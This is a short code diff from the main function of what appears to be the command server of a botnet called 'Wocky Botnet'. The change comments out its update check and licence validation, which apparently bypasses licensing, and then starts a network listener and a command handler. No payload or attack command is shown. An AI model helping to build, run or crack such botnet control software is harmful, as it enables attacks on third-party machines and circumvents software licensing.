@@ -32,8 +32,8 @@ fn main() {
 	wocky_cp.conn_check() or {
 		panic("[x] Error, You have no internet on this box to host Wocky Botnet!\r\n")
 	}
-	wocky_cp.check_update()
-	wocky_cp.licence_valiation()
+	//wocky_cp.check_update()
+	//wocky_cp.licence_valiation()
 	go listener(port)
 	println('[+] NET Started on Port: $port')
 	wocky_cp.command_handler()
